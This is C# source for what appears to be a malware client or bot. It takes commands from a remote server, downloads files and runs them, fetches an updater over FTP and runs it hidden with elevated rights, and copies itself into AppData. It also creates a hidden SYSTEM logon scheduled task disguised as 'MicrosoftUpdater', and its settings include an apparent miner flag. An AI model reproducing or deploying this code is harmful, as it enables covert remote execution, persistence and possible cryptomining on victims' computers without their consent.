using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace ClientWorker
{
	public class Functions
	{

        public void Start()
		{
            
		}

        public void AnalysisAnswer(string answer)
        {
            string comand = answer.Split('_')[0];
            List<string> parametrs = new List<string>();
            parametrs.AddRange(answer.Split('_'));
            parametrs.Remove(comand);

            switch (comand)
            {
                case "GetInfoDevice":
                    SendInfoDevice();
                    Log.Send("SendInfoDevice()");
                    break;

                case "GetSettings":
                    SendSetting();
                    Log.Send("SendSetting()");
                    break;

                case "DownloadAndRun":
                    foreach (string prm in parametrs)
                    {
                        FileManager.GetFileAndRun(prm);
                    }
                    Log.Send("DownloadAndRun()");
                    break;

                case "DownloadUpdater":
                    GetUpdater();
                    Log.Send("GetUpdater()");
                    break;

                case "GetLogList":
                    SendLogList();
                    Log.Send("SendLogList()");
                    break;

                case "Reconnect":
                case "":
                    Reconnect();
                    Log.Send("Reconnect()");
                    break;

                default:
                    Log.Send("UnknownCommand" + answer);
                    break;
            }
        }

        public void GetUpdater()
        {
            Log.Send("GetUpdater()");
            string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            try
            {
                KillUpdater();
                FtpClient.FTPDownloadFile(StartData.updater, folderPath + StartData.floaderNewCopy);
                new Process
                {
                    StartInfo =
                    {
                        FileName = folderPath + StartData.floaderNewCopy + StartData.updater,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        Verb = "runas",
                        Arguments = Program.nameProcess
                    }
                }.Start();
            }
            catch (Exception ex)
            {
                Log.Send("The start process failed: " + ex.ToString());
            }
        }

        private void KillUpdater()
        {
            foreach (Process process in Process.GetProcessesByName("Updater"))
            {
                process.Kill();
            }

            string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

            File.Delete(folderPath + StartData.floaderNewCopy + StartData.updater);
        }
        public void Reconnect()
		{
			Log.Send("Reconnect()");
			try
			{
				Program.client.Clear();
				Program.clientThread.Abort();
			}
			catch
			{

            }

			Program.clientThread = new Thread(new ThreadStart(Program.client.Start));
			Program.clientThread.Start();
		}

        private void SendSetting()
        {
            NetworkStream stream = Program.client.stream;
            byte[] bytes;

            bytes = Encoding.Unicode.GetBytes(Service.Properties.Settings.Default.Comp_name + StartData.delimiter +
                Service.Properties.Settings.Default.IsMiner + StartData.delimiter +
                Service.Properties.Settings.Default.Open_sum + StartData.delimiter +
                Service.Properties.Settings.Default.Start_time + StartData.delimiter +
                Service.Properties.Settings.Default.Version);

            stream.Write(bytes, 0, bytes.Length);

            bytes = Encoding.Unicode.GetBytes("EndSetting");
            stream.Write(bytes, 0, bytes.Length);
        }
        private void SendInfoDevice()
        {

        }
        private void SendLogList()
		{
			NetworkStream stream = Program.client.stream;
			byte[] bytes;
			foreach (string s in Log.messages)
			{
				bytes = Encoding.Unicode.GetBytes(s);
				stream.Write(bytes, 0, bytes.Length);
                Thread.Sleep(0);
			}
			bytes = Encoding.Unicode.GetBytes("EndLog");
			stream.Write(bytes, 0, bytes.Length);
		}

		public static void Registration()
		{
			Log.Send("Registration()");
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			CreateTask();
			Proliferation(folderPath);
		}

		public static void Proliferation(string parth)
		{
			Log.Send("Proliferation()");
			parth += StartData.floaderNewCopy;
			string executablePath = Application.ExecutablePath;
			try
			{
				if (!File.Exists(parth + StartData.service))
				{
					DirectoryInfo directoryInfo = Directory.CreateDirectory(parth);
					File.Copy(executablePath, parth + StartData.service);
				}
			}
			catch (Exception ex)
			{
                Log.Send("Ошибка копирования :" + ex.Message);
			}
		}

		public static void CreateTask()
		{
			new Process
			{
				StartInfo = 
				{
					FileName = "cmd.exe",
					Verb = "runas",
					Arguments = "/C SCHTASKS /Create /RU SYSTEM /SC ONLOGON /TN MicrosoftUpdater /TR C:\\Users\\Fox\\AppData\\Roaming\\MicrosoftUpdater\\" + StartData.service,
					WindowStyle = ProcessWindowStyle.Hidden
				}
			}.Start();
			Log.Send("Задача создана");
		}		
	}
}
